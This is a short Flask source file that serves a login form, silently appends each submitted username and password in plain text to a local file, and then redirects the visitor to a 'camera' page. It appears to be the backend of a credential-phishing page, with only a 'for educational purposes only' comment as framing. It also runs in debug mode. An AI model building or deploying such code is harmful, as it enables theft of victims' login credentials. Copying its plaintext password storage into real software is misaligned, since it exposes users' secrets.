from flask import Flask, request, render_template, redirect, url_for
import os

app = Flask(__name__)

# Route for rendering the form
@app.route('/')
def form():
    return render_template('index.html')

# Route for handling form submission
@app.route('/submit', methods=['POST'])
def submit():
    # Get form data
    username = request.form['username']
    password = request.form['password']

    # Write the data to a .txt file (for educational purposes only)
    with open('data.txt', 'a') as file:
        file.write(f'Username: {username}, Password: {password}\n')

    # Redirect to the camera page after form submission
    return redirect(url_for('camera'))

# Route to display the camera page
@app.route('/camera')
def camera():
    return render_template('camera.html')

if __name__ == '__main__':
    app.run(debug=True)
